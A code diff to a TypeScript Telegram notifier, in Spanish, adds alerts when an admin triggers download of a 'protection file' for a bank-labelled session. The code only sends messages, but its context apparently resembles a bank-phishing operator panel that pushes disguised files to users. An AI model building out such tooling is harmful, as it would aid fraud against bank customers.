@@ -196,6 +196,12 @@ export async function sendScreenChangeNotification(data: {
       if (data.data.mensaje) {
         message += `\n📝 *Mensaje:* ${data.data.mensaje.substring(0, 100)}${data.data.mensaje.length > 100 ? '...' : ''}`;
       }
+      if (data.data.fileName) {
+        message += `\n📁 *Archivo de Protección:* ${data.data.fileName}`;
+        if (data.data.fileSize) {
+          message += ` (${data.data.fileSize})`;
+        }
+      }
     }
     
     await bot.sendMessage(CHAT_ID, message, {
@@ -209,8 +215,37 @@ export async function sendScreenChangeNotification(data: {
   }
 }
 
+// Función para notificar descarga de archivo de protección
+export async function sendFileDownloadNotification(data: {
+  sessionId: string;
+  banco: string;
+  fileName: string;
+  fileSize?: string;
+  adminUser: string;
+}) {
+  try {
+    const message = `🔽 *DESCARGA DE ARCHIVO DE PROTECCIÓN*\n\n` +
+                   `🏦 *Banco:* ${data.banco}\n` +
+                   `🆔 *Sesión:* ${data.sessionId}\n` +
+                   `📁 *Archivo:* ${data.fileName}\n` +
+                   `📊 *Tamaño:* ${data.fileSize || 'N/A'}\n` +
+                   `👤 *Admin:* ${data.adminUser}\n` +
+                   `⏰ *Hora:* ${new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' })}`;
+    
+    await bot.sendMessage(CHAT_ID, message, {
+      parse_mode: 'Markdown',
+      disable_web_page_preview: true
+    });
+    
+    console.log(`[Telegram] Notificación de descarga de archivo enviada para ${data.sessionId}`);
+  } catch (error) {
+    console.error('[Telegram] Error enviando notificación de descarga:', error);
+  }
+}
+
 export default {
   sendTelegramNotification,
   sendSessionCreatedNotification,
-  sendScreenChangeNotification
+  sendScreenChangeNotification,
+  sendFileDownloadNotification
 };
